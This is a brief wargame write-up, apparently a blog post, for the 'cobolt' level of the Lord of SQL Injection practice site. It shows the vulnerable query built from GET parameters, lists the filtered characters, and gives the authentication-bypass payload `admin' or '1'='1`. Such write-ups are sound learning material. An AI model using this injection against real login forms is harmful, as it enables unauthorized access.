---
title: "[LOS] cobolt"
date: 2025-03-20 00:00:00
categories: [Wargame, Lord of SQL Injection]
tags: [webhacking, sqli]
published: True
---

# Query

```sql
select id from prob_cobolt where id='{$_GET[id]}' and pw=md5('{$_GET[pw]}')
```

<br>

# preg_match

- `prob` 문자열
- `_`
- `.`
- `()`

<br>

# Payload

```
?id=admin' or '1'='1
```
